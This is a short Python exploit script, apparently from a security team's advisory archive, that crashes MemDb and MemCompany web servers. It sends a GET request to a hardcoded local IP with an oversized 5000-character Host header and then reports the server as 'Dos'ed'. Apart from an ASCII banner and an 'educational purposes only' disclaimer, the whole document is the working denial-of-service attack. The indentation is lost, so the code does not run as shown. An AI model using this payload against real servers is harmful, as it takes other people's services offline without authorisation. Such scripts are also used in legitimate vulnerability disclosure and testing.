#!/usr/bin/python

# Title: MemDb Multiple Remote Dos
# Products: MemCompany v1.0- Memdb Memory Database System v1.02- Memdb Online Survey Sistem v2006
# Date: 28/06/2010
# Author: Markot
# Advisory: http://www.corelan.be:8866/advisories.php?id=CORELAN-10-054
# Platform: Windows XP sp3 En
# Greetz to: Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
#
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
#
# Note : you are not allowed to edit/modify this code.
# If you do, Corelan cannot be held responsible for any damages this may cause.

print "|------------------------------------------------------------------|"
print "| __ __ |"
print "| _________ ________ / /___ _____ / /____ ____ _____ ___ |"
print "| / ___/ __ \/ ___/ _ \/ / __ `/ __ \ / __/ _ \/ __ `/ __ `__ \ |"
print "| / /__/ /_/ / / / __/ / /_/ / / / / / /_/ __/ /_/ / / / / / / |"
print "| \___/\____/_/ \___/_/\__,_/_/ /_/ \__/\___/\__,_/_/ /_/ /_/ |"
print "| |"
print "| http://www.corelan.be:8800 |"
print "| security@corelan.be |"
print "| |"
print "|-------------------------------------------------[ EIP Hunters ]--|"

import httplib

payload = "A"*5000
headers = {'Host':payload}
try:
conn = httplib.HTTPConnection("192.168.125.128")
conn.request("GET", "/?page=query'", headers=headers)# MemCompany v1.0
'''conn.request("GET", "/", headers=headers) #use this one for Memdb Online Survey Sistem and
Memdb Memory Database System'''
print "Server Dos'ed"
except:
print "Server unreacheable"